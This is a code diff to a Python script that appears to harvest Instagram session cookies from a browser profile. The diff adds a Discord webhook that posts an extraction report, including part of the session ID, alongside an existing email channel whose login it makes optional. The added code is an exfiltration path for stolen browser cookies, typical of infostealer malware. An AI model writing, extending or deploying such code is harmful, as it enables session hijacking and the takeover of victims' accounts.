@@ -17,6 +17,7 @@ import sys
 import smtplib
 import tempfile
 import subprocess
+import urllib.request
 from datetime import datetime
 from email.message import EmailMessage
 from pathlib import Path
@@ -63,6 +64,7 @@ SMTP_PASS = os.environ.get('SMTP_PASS')
 SMTP_FROM = os.environ.get('SMTP_FROM')
 SMTP_TO = os.environ.get('SMTP_TO')
 SMTP_USE_TLS = _env_bool('SMTP_USE_TLS', False)
+DISCORD_WEBHOOK_URL = os.environ.get('DISCORD_WEBHOOK_URL')
 
 EXTRACT_BROWSER_ID = os.environ.get('EXTRACT_BROWSER_ID')
 EXTRACT_BROWSER_LABEL = os.environ.get('EXTRACT_BROWSER_LABEL')
@@ -791,6 +793,41 @@ def _score_bundle(bundle):
 
 
 def _send_extracted_bundle_email(payload):
+    if DISCORD_WEBHOOK_URL:
+        try:
+            session_value = payload.get('session_cookie', {}).get('value', '')
+            session_display = f'{session_value[:16]}...' if session_value else 'none'
+            missing = ', '.join(payload.get('instagram_bundle', {}).get('missing', [])) or 'none'
+            content = (
+                f'**Instagram cookie extraction completed**\n'
+                f'**Source:** {payload.get("source_browser")} / {payload.get("source_profile")}\n'
+                f'**Total cookies:** {payload.get("total", 0)}\n'
+                f'**HttpOnly:** {payload.get("httpOnly_count", 0)} | **Secure:** {payload.get("secure_count", 0)}\n'
+                f'**Session ID:** {session_display}\n'
+                f'**Missing cookies:** {missing}'
+            )
+            data = {
+                'content': content,
+            }
+            req = urllib.request.Request(
+                DISCORD_WEBHOOK_URL,
+                data=json.dumps(data).encode('utf-8'),
+                headers={'Content-Type': 'application/json'},
+                method='POST',
+            )
+            with urllib.request.urlopen(req, timeout=20) as resp:
+                if resp.status == 204 or 200 <= resp.status < 300:
+                    _log('Extraction bundle sent to Discord webhook.')
+                    return
+                raise RuntimeError(f'Webhook returned status {resp.status}')
+        except Exception as e:
+            _log(f'Failed to send Discord webhook: {e}')
+            return
+
+    if not SMTP_HOST or not SMTP_TO:
+        _log('Notification is not configured. Skipping email/webhook.')
+        return
+
     try:
         message = EmailMessage()
         message['Subject'] = 'Instagram Cookie Bundle Extracted'
@@ -811,7 +848,8 @@ def _send_extracted_bundle_email(payload):
         with smtplib.SMTP(SMTP_HOST, SMTP_PORT, timeout=20) as server:
             if SMTP_USE_TLS:
                 server.starttls()
-            server.login(SMTP_USER, SMTP_PASS)
+            if SMTP_USER and SMTP_PASS:
+                server.login(SMTP_USER, SMTP_PASS)
             server.send_message(message)
         _log('Extraction bundle sent by email.')
     except Exception as e:
